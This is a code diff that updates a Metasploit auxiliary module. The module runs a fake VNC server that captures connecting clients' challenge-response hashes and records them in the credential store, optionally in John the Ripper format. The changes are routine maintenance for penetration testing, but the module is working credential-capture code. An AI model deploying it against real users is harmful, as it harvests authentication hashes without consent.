@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::TcpServer
   include Msf::Auxiliary::Report
 
@@ -29,7 +26,7 @@ class Metasploit3 < Msf::Auxiliary
         OptPort.new('SRVPORT', [ true, "The local port to listen on.", 5900 ]),
         OptString.new('CHALLENGE', [ true, "The 16 byte challenge", "00112233445566778899AABBCCDDEEFF" ]),
         OptString.new('JOHNPWFILE',  [ false, "The prefix to the local filename to store the hashes in JOHN format", nil ])
-      ], self.class)
+      ])
   end
 
   def setup
@@ -61,6 +58,32 @@ class Metasploit3 < Msf::Auxiliary
     c.put "RFB 003.007\n"
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :nonreplayable_hash
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
   def on_client_data(c)
     data = c.get_once
     return if not data
@@ -89,18 +112,15 @@ class Metasploit3 < Msf::Auxiliary
     elsif @state[c][:chall]
       c.put [0x00000001].pack("N")
       c.close
-      print_status("#{peer} - Challenge: #{@challenge.unpack('H*')[0]}; Response: #{data.unpack('H*')[0]}")
+      print_good("#{peer} - Challenge: #{@challenge.unpack('H*')[0]}; Response: #{data.unpack('H*')[0]}")
       hash_line = "$vnc$*#{@state[c][:chall].unpack("H*")[0]}*#{data.unpack('H*')[0]}"
-      report_auth_info(
-        :host  => c.peerhost,
-        :port => datastore['SRVPORT'],
-        :sname => 'vnc_client',
-        :user => "",
-        :pass => hash_line,
-        :type => "vnc_hash",
-        :proof => hash_line,
-        :source_type => "captured",
-        :active => true
+      report_cred(
+        ip: c.peerhost,
+        port: datastore['SRVPORT'],
+        service_name: 'vnc_client',
+        user: '',
+        password: hash_line,
+        proof: hash_line
       )
 
       if(datastore['JOHNPWFILE'])
